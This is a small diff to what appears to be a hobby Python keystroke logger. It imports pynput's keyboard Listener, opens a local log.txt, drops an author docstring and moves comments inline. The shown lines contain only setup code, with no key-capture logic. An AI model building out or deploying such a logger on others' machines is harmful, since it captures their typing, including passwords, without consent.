@@ -1,15 +1,9 @@
-"""
-@author	Swapnil Mali	B.Tech Information Technology
-"""
-
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 
-#opening log file in append mode
-fp = open('log.txt', '+a')
+fp = open('log.txt', '+a')  #opening log file in append mode
 
-#current date and time
-log_time = datetime.now()
+log_time = datetime.now()   #current date and time
 
 #starting every log neatly
 fp.write('\n\n\n')
